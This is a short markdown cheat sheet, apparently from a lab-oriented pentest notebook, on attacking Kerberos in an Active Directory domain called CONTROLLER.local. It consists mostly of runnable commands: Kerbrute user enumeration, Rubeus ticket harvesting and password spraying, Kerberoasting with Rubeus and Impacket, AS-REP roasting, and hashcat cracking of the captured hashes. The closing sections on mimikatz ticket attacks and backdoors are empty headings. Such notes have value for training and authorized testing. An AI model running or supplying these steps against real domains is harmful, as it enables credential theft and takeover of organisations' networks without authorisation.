# Attacking Kerberos

## Enumeration with Kerbrute

{% hint style="info" %}
Make sure to have added the domain to the /etc/hosts file
{% endhint %}

```bash
/home/kali/go/bin/kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```

## Harvesting & Brute-Forcing Tickets w/Rubeus

{% hint style="info" %}
You will need to already be on the target having used RDP or SSH
{% endhint %}

```powershell
# This command tells Rubeus to harvest for TGTs every 30 seconds
C:\Users\Administrator\Downloads>Rubeus.exe harvest /interval:30
```

{% hint style="info" %}
Before Password Spraying we need to add the Domain to the Windows Hosts file
{% endhint %}

```powershell
# Adding Domain to the Windows Hosts file
echo 10.10.171.128 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
# This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user 
Rubeus.exe brute /password:Password1 /noticket
```

## Kerberoasting w/ Rubeus & Impacket

### Method 1 - Rubeus

```powershell
Rubeus.exe kerberoast
# Crack any found hashes
head http-hash.txt
$krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.local:302...
hashcat -m 13100 -a 0 http-hash.txt Pass.txt
```

### Method 2 - Impacket

```bash
python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.199.11 -request
# Crack any found hashes
head sql-hash.txt
$krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.local:301...
hashcat -m 13100 -a 0 sql-hash.txt Pass.tx
```

## AS-REP Roasting w/ Rubeus

```powershell
# Again from the target Windows machine
Rubeus.exe asreproast
# Crack the found hashes with Hashcat
head admin2-hash.txt
$krb5asrep$Admin2@CONTROLLER.local:167...
# Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User...
head admin2-hash.txt
$krb5asrep$23$Admin2@CONTROLLER.local:167...
hashcat -m 18200 -a 0 admin2-hash.txt Pass.txt
```

## Pass the Ticket w/ mimikatz

## Golden/Silver Ticket Attacks w/ mimikatz

## Kerberos Backdoors w/mimikatz
